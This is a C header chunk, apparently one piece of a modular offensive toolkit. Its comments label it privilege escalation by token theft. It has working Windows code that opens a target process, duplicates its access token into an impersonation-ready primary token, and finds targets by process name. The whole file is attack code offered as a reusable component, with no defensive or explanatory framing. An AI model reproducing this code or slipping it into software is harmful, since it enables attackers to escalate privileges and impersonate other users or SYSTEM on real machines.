// chunk: privesc/token_steal
// depends: (none)
// provides: token_steal
// headers: windows.h
// note: Steal access token from target process via OpenProcessToken + DuplicateToken

#ifndef CHUNK_PRIVESC_TOKEN_STEAL
#define CHUNK_PRIVESC_TOKEN_STEAL

static HANDLE token_steal(DWORD target_pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProcess) {
        return NULL;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return NULL;
    }

    HANDLE hDupToken = NULL;
    BOOL success = DuplicateTokenEx(
        hToken,
        MAXIMUM_ALLOWED,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hDupToken
    );

    CloseHandle(hToken);
    CloseHandle(hProcess);

    return success ? hDupToken : NULL;
}

static int token_steal_from_name(const char *process_name, HANDLE *out_token) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, process_name) == 0) {
                HANDLE tok = token_steal(pe.th32ProcessID);
                if (tok) {
                    *out_token = tok;
                    CloseHandle(hSnap);
                    return 1;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}

#endif
